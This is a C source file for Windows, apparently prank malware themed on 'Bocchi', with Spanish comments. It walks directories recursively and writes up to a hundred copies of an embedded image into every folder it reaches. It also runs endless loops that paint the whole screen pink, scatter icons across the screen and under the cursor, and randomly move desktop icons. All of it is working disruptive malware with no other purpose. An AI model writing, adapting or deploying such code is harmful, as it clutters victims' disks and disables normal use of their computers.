//Declarar funciones 
//Si ya se es una cagada

#include<stdio.h>
#include <stdlib.h>
#include <time.h>
#include <dirent.h>
#include <windows.h>
#include <unistd.h>
#include <commctrl.h>
#include <Lmcons.h>
#include "Bochi_funciones.h"
#include "Archivo_header_bytes2.h" //Si se preguntan por que dos archivos no me dejo incluir los bytes de este en el primer archivo xD

void fotos_multiplicar(char* Directorio){
   char * cadena;
   cadena = (char*) malloc(1000 * sizeof(char)); //Cadena re ajustable con un tamaño inicial de 1000 caracteres
   int size_cadena = _msize(cadena);
   int size_directorio = strlen(Directorio); 

   if(size_directorio > size_cadena){
      int total_size = size_directorio + 100;
      cadena = (char*) realloc(cadena, total_size * sizeof(char)); //Si el directorio sobrepasa aumenta el tamaño de la variable
   }

   int randomNumber = rand() % 101; //Se pone 101 por que la cuenta empieza desde el 0

   DWORD attributes = GetFileAttributes(Directorio); //Detecta si es un directorio y no un archivo

   if (attributes & FILE_ATTRIBUTE_DIRECTORY) {  //Si es un directorio ejecuta el duplicado de fotos

      for (int i = 0; i < randomNumber; i++){
            
        sprintf(cadena, "%sBocchi_find_you%i.jpg" ,Directorio,i); //Crea un string a partir de otros
        FILE * foto = fopen(cadena, "wb");
        int longitud = sizeof(lista_hex2) / sizeof(lista_hex2[0]);

        if (foto == NULL){
           continue;
        }
        for (int i = 0 ; i < longitud ; i++){
            fwrite(&lista_hex2[i] , sizeof(unsigned char) , 1 , foto);
        }
        fclose(foto);
      }    
   }
   free(cadena); //Liberamos la memoria   
}   

void * Recorrer_Directorio(void *arg){
   char* rt = (char*)arg;
   struct dirent *dp;
   char  Rc[1000];
   DIR *dir = opendir(rt);

   while ((dp = readdir(dir)) != NULL){
      if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0){     
        sprintf(Rc , "%s\\%s\\" , rt , dp->d_name);
        /*################################*/
        fotos_multiplicar(Rc);
        Recorrer_Directorio(Rc);              
   }  }     
}
void * Draw_rose_desktop(void*arg){
   sleep(100);
   while(1){
      HDC hDC = GetDC(NULL);
      // Crea un pincel de color rosa
      HBRUSH hbrush = CreateSolidBrush(RGB(255, 105, 180));

      // Selecciona el pincel en el dispositivo de contexto
      HBRUSH hbrushOld = (HBRUSH)SelectObject(hDC, hbrush);

      // Dibuja en toda la pantalla con el pincel
      PatBlt(hDC, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), PATCOPY);

      // Limpiar la pantalla
      SelectObject(hDC, hbrushOld);
      DeleteObject(hbrush);
      ReleaseDC(HWND_DESKTOP, hDC);
      sleep(10);
   }
}

void * Draw_icon_desktop(void*arg){
   sleep(100);
   while(1){
      HDC hDC = GetDC(NULL);
      int width = GetSystemMetrics(SM_CXSCREEN); 
      int height = GetSystemMetrics(SM_CYSCREEN);

      int randomNumber_width2 = rand() % width;
      int randomNumber_height2 = rand()% height;
   
      usleep(1000);
      HICON hIcon = (HICON) LoadImage(NULL, "C:\\Windows\\Temp\\Icono_bochi_desktop.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
      
      DrawIcon(hDC, randomNumber_width2, randomNumber_height2, hIcon);
      ReleaseDC(NULL, hDC);  
   }
}

void * Draw_icon(void*arg){
   while(1){
      HDC hDC = GetDC(NULL);
      usleep(100000);
      POINT point;

      if (GetCursorPos(&point)) {
         LONG x = point.x;
         LONG y = point.y; 
           
         HICON hIcon = (HICON) LoadImage(NULL, "C:\\Windows\\Temp\\Icono_bochi.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
         
         // Dibuja el icono en las coordenadas (100, 100)
         DrawIcon(hDC, x, y, hIcon);
         // Libera el contexto del dispositivo cuando hayas terminado
         ReleaseDC(NULL, hDC);
      }  
   }
}

void * Move_icon(void*arg){
   while (1) {
      HWND desktopHandle = FindWindow("Progman", "Program Manager");
      desktopHandle = FindWindowEx(desktopHandle, NULL, "SHELLDLL_DefView", NULL);
      desktopHandle = FindWindowEx(desktopHandle, NULL, "SysListView32", "FolderView");
      int iconCount = SendMessage(desktopHandle, LVM_GETITEMCOUNT, 0, 0);

      int width = GetSystemMetrics(SM_CXSCREEN);
      int height = GetSystemMetrics(SM_CYSCREEN);

      int randomNumber_width = rand() % width;
      int randomNumber_height = rand()% height;
      int randomNumber_icons = rand() % iconCount;

      SendMessage(desktopHandle, LVM_SETITEMPOSITION, randomNumber_icons, MAKELPARAM(randomNumber_height, randomNumber_height));
      
   }  
}


